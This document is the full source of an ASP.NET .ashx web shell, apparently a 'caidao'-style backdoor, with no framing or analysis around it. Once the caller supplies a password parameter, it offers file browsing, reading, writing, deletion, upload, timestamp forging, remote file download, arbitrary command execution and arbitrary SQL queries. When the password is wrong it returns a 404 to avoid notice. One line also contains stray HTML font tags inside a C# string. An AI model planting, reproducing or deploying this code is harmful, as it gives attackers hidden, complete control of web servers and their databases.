<%@ WebHandler Language="C#" Class="Handler" %>
using System;
using System.Web;
using System.IO;
using System.Text;
using System.Net;
using System.Diagnostics;
using System.Data.SqlClient;
using System.Data;


public class Handler : IHttpHandler
{
    private static string PSW = "" + (0 - 2 - 5);   // 你懂的
    private static int errorCode = 404;             // 如果密码不对，返回自定义状态码

    public bool IsReusable
    {
        get
        {
            return false;
        }
    }

    public void ProcessRequest(HttpContext context)
    {
        if (HelloWorld(context) == false)
        {
            context.Response.StatusCode = errorCode;
            context.Server.Transfer(System.DateTime.Now.ToBinary() + ".<strong><font color="#FF0000">ashx</font></strong>", false);
        }
    }

    private bool HelloWorld(HttpContext context)
    {
        System.Web.HttpContext hct = context;
        string Ret = string.Empty;
        try
        {
            string Z = hct.Request.Params[PSW];
            string Z0 = hct.Request.Params["z0"];
            string Z1 = hct.Request.Params["z1"];
            string Z2 = hct.Request.Params["z2"];
            if (isEmpty(Z) == true)
            {
                return false;
            }
            switch (Z)
            {
                case "A":
                    {
                        String[] c = Directory.GetLogicalDrives();
                        Ret = String.Format("{0}\t", System.Web.HttpContext.Current.Server.MapPath("/"));
                        for (int i = 0; i < c.Length; i++)
                            Ret += c[i][0] + ":";
                        break;
                    }
                case "B":
                    {
                        DirectoryInfo m = new DirectoryInfo(Z1);
                        foreach (DirectoryInfo D in m.GetDirectories())
                        {
                            Ret += String.Format("{0}/\t{1}\t0\t-\n", D.Name,
                                File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"));
                        }
                        foreach (FileInfo D in m.GetFiles())
                        {
                            Ret += String.Format("{0}\t{1}\t{2}\t-\n", D.Name,
                                File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"),
                                D.Length);
                        }
                        break;
                    }
                case "C":
                    {
                        StreamReader m = new StreamReader(Z1, Encoding.Default);
                        Ret = m.ReadToEnd();
                        m.Close();
                        break;
                    }
                case "D":
                    {
                        StreamWriter m = new StreamWriter(Z1, false, Encoding.Default);
                        m.Write(Z2);
                        Ret = "1";
                        m.Close();
                        break;
                    }
                case "E":
                    {
                        if (Directory.Exists(Z1))
                            Directory.Delete(Z1, true);
                        else File.Delete(Z1);
                        Ret = "1";
                        break;
                    }
                case "F":
                    {
                        hct.Response.Clear();
                        hct.Response.Write("\x2D\x3E\x7C");
                        hct.Response.WriteFile(Z1);
                        hct.Response.Write("\x7C\x3C\x2D");
                        return true;
                    }
                case "G":
                    {
                        byte[] B = new byte[Z2.Length / 2];
                        for (int i = 0; i < Z2.Length; i += 2)
                        {
                            B[i / 2] = (byte)Convert.ToInt32(Z2.Substring(i, 2), 16);
                        }
                        FileStream fs = new FileStream(Z1, FileMode.Create);
                        fs.Write(B, 0, B.Length);
                        fs.Close();
                        Ret = "1";
                        break;
                    }
                case "H":
                    {
                        CP(Z1, Z2);
                        Ret = "1";
                        break;
                    }
                case "I":
                    {
                        if (Directory.Exists(Z1))
                        {
                            Directory.Move(Z1, Z2);
                        }
                        else
                        {
                            File.Move(Z1, Z2);
                        }
                        break;
                    }
                case "J":
                    {
                        Directory.CreateDirectory(Z1);
                        Ret = "1";
                        break;
                    }
                case "K":
                    {
                        DateTime TM = Convert.ToDateTime(Z2);
                        if (Directory.Exists(Z1))
                        {
                            Directory.SetCreationTime(Z1, TM);
                            Directory.SetLastWriteTime(Z1, TM);
                            Directory.SetLastAccessTime(Z1, TM);
                        }
                        else
                        {
                            File.SetCreationTime(Z1, TM);
                            File.SetLastWriteTime(Z1, TM);
                            File.SetLastAccessTime(Z1, TM);
                        }
                        Ret = "1";
                        break;
                    }
                case "L":
                    {
                        HttpWebRequest RQ = (HttpWebRequest)WebRequest.Create(new Uri(Z1));
                        RQ.Method = "GET";
                        RQ.ContentType = "application/x-www-form-urlencoded";
                        HttpWebResponse WB = (HttpWebResponse)RQ.GetResponse();
                        Stream WF = WB.GetResponseStream();
                        FileStream FS = new FileStream(Z2, FileMode.Create, FileAccess.Write);
                        int i; byte[] buffer = new byte[1024];
                        while (true)
                        {
                            i = WF.Read(buffer, 0, buffer.Length);
                            if (i < 1)
                                break;
                            FS.Write(buffer, 0, i);
                        }
                        WF.Close();
                        WB.Close();
                        FS.Close();
                        Ret = "1";
                        break;
                    }
                case "M":
                    {
                        ProcessStartInfo c = new ProcessStartInfo(Z1.Substring(2));
                        Process e = new Process();
                        StreamReader OT, ER;
                        c.UseShellExecute = false;
                        c.RedirectStandardOutput = true;
                        c.RedirectStandardError = true;
                        e.StartInfo = c;
                        c.Arguments = String.Format("{0} {1}", Z1.Substring(0, 2), Z2);
                        e.Start();
                        OT = e.StandardOutput;
                        ER = e.StandardError;
                        e.Close();
                        Ret = OT.ReadToEnd() + ER.ReadToEnd();
                        break;
                    }
                case "N":
                    {
                        String strDat = Z1.ToUpper();
                        SqlConnection Conn = new SqlConnection(Z1);
                        Conn.Open();
                        Ret = Conn.Database + "\t"; Conn.Close();
                        break;
                    }
                case "O":
                    {
                        String[] x = Z1.Replace("\r", "").Split('\n');
                        String strConn = x[0], strDb = x[1];
                        SqlConnection Conn = new SqlConnection(strConn);
                        Conn.Open();
                        DataTable dt = Conn.GetSchema("Columns");
                        Conn.Close();
                        for (int i = 0; i < dt.Rows.Count; i++)
                        {
                            Ret += String.Format("{0}\t", dt.Rows[i][2].ToString());
                        }
                        break;
                    }
                case "P":
                    {
                        String[] x = Z1.Replace("\r", "").Split('\n'), p = new String[4];
                        String strConn = x[0], strDb = x[1], strTable = x[2];
                        p[0] = strDb;
                        p[2] = strTable;
                        SqlConnection Conn = new SqlConnection(strConn);
                        Conn.Open();
                        DataTable dt = Conn.GetSchema("Columns", p);
                        Conn.Close();
                        for (int i = 0; i < dt.Rows.Count; i++)
                        {
                            Ret += String.Format("{0} ({1})\t",
                                dt.Rows[i][3].ToString(), dt.Rows[i][7].ToString());
                        }
                        break;
                    }
                case "Q":
                    {
                        String[] x = Z1.Replace("\r", "").Split('\n');
                        String strDat, strConn = x[0], strDb = x[1]; int i, c;
                        strDat = Z2.ToUpper();
                        SqlConnection Conn = new SqlConnection(strConn);
                        Conn.Open();
                        if (strDat.IndexOf("SELECT ") == 0
                            || strDat.IndexOf("EXEC ") == 0
                            || strDat.IndexOf("DECLARE ") == 0)
                        {
                            SqlDataAdapter OD = new SqlDataAdapter(Z2, Conn);
                            DataSet ds = new DataSet();
                            OD.Fill(ds);
                            if (ds.Tables.Count > 0)
                            {
                                DataRowCollection rows = ds.Tables[0].Rows;
                                for (c = 0; c < ds.Tables[0].Columns.Count; c++)
                                {
                                    Ret += String.Format("{0}\t|\t",
                                        ds.Tables[0].Columns[c].ColumnName.ToString());
                                }
                                Ret += "\r\n";
                                for (i = 0; i < rows.Count; i++)
                                {
                                    for (c = 0; c < ds.Tables[0].Columns.Count; c++)
                                    {
                                        Ret += String.Format("{0}\t|\t",
                                            rows[i][c].ToString());
                                    }
                                    Ret += "\r\n";
                                }
                            }
                            ds.Clear();
                            ds.Dispose();
                        }
                        else
                        {
                            SqlCommand cm = Conn.CreateCommand();
                            cm.CommandText = Z2;
                            cm.ExecuteNonQuery();
                            Ret = "Result\t|\t\r\nExecute Successfully!\t|\t\r\n";
                        }
                        Conn.Close();
                        break;
                    }
                default:
                    {
                        return false;
                    };
            }
        }
        catch (Exception e2)
        {
            Ret = e2.Message;
        }
        hct.Response.Write("\x2D\x3E\x7C" + Ret + "\x7C\x3C\x2D");
        return true;
    }

    void CP(String S, String D)
    {
        if (Directory.Exists(S))
        {
            DirectoryInfo m = new DirectoryInfo(S);
            Directory.CreateDirectory(D);
            foreach (FileInfo F in m.GetFiles())
            {
                File.Copy(S + "\\" + F.Name, D + "\\" + F.Name);
            }
            foreach (DirectoryInfo F in m.GetDirectories())
            {
                CP(S + "\\" + F.Name, D + "\\" + F.Name);
            }
        }
        else
        {
            File.Copy(S, D);
        }
    }

    private static bool isEmpty(string str)
    {
        if (str == null || str == string.Empty)
            return true;
        return false;
    }
}
